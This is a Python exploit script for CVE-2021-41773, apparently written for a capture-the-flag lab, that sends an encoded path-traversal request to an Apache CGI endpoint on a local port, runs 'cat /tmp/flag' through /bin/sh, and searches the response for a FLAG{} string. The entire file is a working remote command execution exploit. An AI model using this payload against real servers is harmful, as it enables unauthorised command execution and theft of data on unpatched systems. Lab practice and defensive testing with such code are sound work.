import urllib.request
import urllib.error
import re

# Target URL with path traversal exploit
target_url = "http://127.0.0.1:32808/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# Command to execute
command = "cat /tmp/flag"

print(f"[+] Exploiting CVE-2021-41773")
print(f"[+] Target: {target_url}")
print(f"[+] Command: {command}")
print()

try:
    # Create request with command in body
    req = urllib.request.Request(
        target_url,
        data=command.encode('utf-8'),
        method='POST'
    )
    
    # Send request
    with urllib.request.urlopen(req, timeout=5) as response:
        response_data = response.read().decode('utf-8', errors='ignore')
        
        print(f"[+] Status: {response.status}")
        print(f"[+] Length: {len(response_data)}B")
        print()
        print(f"[+] Full Response:")
        print(response_data)
        print()
        
        # Search for FLAG{} pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response_data)
        
        if flag_match:
            flag = flag_match.group(0)
            print(f"[!] FLAG FOUND: {flag}")
        else:
            print("[-] No FLAG{} pattern found")
    
except urllib.error.HTTPError as e:
    print(f"[-] HTTP Error: {e.code}")
    response_data = e.read().decode('utf-8', errors='ignore')
    print(f"[+] Response: {response_data}")
    
    # Still search for flag in error response
    flag_match = re.search(r'FLAG\{[^}]+\}', response_data)
    if flag_match:
        print(f"[!] FLAG FOUND: {flag_match.group(0)}")
        
except Exception as e:
    print(f"[-] Error: {type(e).__name__}: {str(e)}")

